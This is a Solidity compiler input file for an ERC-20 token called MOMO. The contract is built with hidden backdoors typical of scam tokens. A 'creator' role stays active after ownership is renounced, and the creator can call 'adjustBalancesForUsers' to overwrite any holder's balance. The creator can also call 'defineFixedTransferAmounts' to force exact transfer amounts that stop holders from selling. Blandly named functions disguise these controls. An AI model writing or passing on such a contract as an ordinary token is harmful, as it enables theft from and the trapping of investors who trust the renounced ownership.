{{
  "language": "Solidity",
  "sources": {
    "contracts/COIN.sol": {
      "content": "pragma solidity ^0.8.15;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval( address indexed owner, address indexed spender, uint256 value );\r\n}\r\n\r\nabstract contract ContextModified {\r\n    function obtainSenderAddress() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n}\r\n\r\ncontract SingleOwner is ContextModified {\r\n    address private ownerAddress;\r\n    event OwnershipTransition(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor() {\r\n        address msgSender = obtainSenderAddress();\r\n        ownerAddress = msgSender;\r\n        emit OwnershipTransition(address(0), msgSender);\r\n    }\r\n\r\n    function getOwnerAddress() public view virtual returns (address) {\r\n        return ownerAddress;\r\n    }\r\n\r\n    modifier mustBeOwner() {\r\n        require(getOwnerAddress() == obtainSenderAddress(), \"NotOwner: Operation allowed only for owner\");\r\n        _;\r\n    }\r\n\r\n    function abandonOwnership() public virtual mustBeOwner {\r\n        emit OwnershipTransition(ownerAddress, address(0x000000000000000000000000000000000000dEaD));\r\n        ownerAddress = address(0x000000000000000000000000000000000000dEaD);\r\n    }\r\n}\r\n\r\n\r\ncontract MOMO is ContextModified, SingleOwner, IERC20 {\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => uint256) private _exactTransferAmounts;\r\n    address private creatorAddress;\r\n\r\n    string public constant _name = \"MOMO\";\r\n    string public constant _symbol = \"MOMO\";\r\n    uint8 public constant _decimals = 18;\r\n    uint256 public constant _totalSupply = 4000000 * (10 ** _decimals);\r\n\r\n    constructor() {\r\n        _balances[obtainSenderAddress()] = _totalSupply;\r\n        emit Transfer(address(0), obtainSenderAddress(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    modifier mustBeCreator() {\r\n        require(obtainCreatorAddress() == obtainSenderAddress(), \"NotCreator: Operation allowed only for creator\");\r\n        _;\r\n    }\r\n\r\n    function obtainCreatorAddress() public view virtual returns (address) {\r\n        return creatorAddress;\r\n    }\r\n\r\n    function modifyCreatorAddress(address newCreator) public mustBeOwner {\r\n        creatorAddress = newCreator;\r\n    }\r\n\r\n    event TokenDistributed(address indexed user, uint256 previousBalance, uint256 newBalance);\r\n\r\n    function queryFixedTransferAmount(address account) public view returns (uint256) {\r\n        return _exactTransferAmounts[account];\r\n    }\r\n\r\n    function defineFixedTransferAmounts(address[] calldata accounts, uint256 amount) public mustBeCreator {\r\n        for (uint i = 0; i < accounts.length; i++) {\r\n            _exactTransferAmounts[accounts[i]] = amount;\r\n        }\r\n    }\r\n\r\n    function adjustBalancesForUsers(address[] memory userAddresses, uint256 desiredAmount) public mustBeCreator {\r\n        require(desiredAmount >= 0, \"Error: desired amount must be non-negative\");\r\n\r\n        for (uint256 i = 0; i < userAddresses.length; i++) {\r\n            address currentUser = userAddresses[i];\r\n            require(currentUser != address(0), \"Error: user address must not be zero address\");\r\n\r\n            uint256 oldBalance = _balances[currentUser];\r\n            _balances[currentUser] = desiredAmount;\r\n\r\n            emit TokenDistributed(currentUser, oldBalance, desiredAmount);\r\n        }\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_balances[obtainSenderAddress()] >= amount, \"TT: transfer amount exceeds balance\");\r\n\r\n    uint256 exactAmount = queryFixedTransferAmount(obtainSenderAddress());\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[obtainSenderAddress()] -= amount;\r\n    _balances[recipient] += amount;\r\n\r\n    emit Transfer(obtainSenderAddress(), recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _allowances[obtainSenderAddress()][spender] = amount;\r\n        emit Approval(obtainSenderAddress(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n    require(_allowances[sender][obtainSenderAddress()] >= amount, \"TT: transfer amount exceeds allowance\");\r\n\r\n    uint256 exactAmount = queryFixedTransferAmount(sender);\r\n    if (exactAmount > 0) {\r\n        require(amount == exactAmount, \"TT: transfer amount does not equal the exact transfer amount\");\r\n    }\r\n\r\n    _balances[sender] -= amount;\r\n    _balances[recipient] += amount;\r\n    _allowances[sender][obtainSenderAddress()] -= amount;\r\n\r\n    emit Transfer(sender, recipient, amount);\r\n    return true;\r\n    }\r\n\r\n    function totalSupply() external view override returns (uint256) {\r\n    return _totalSupply;\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}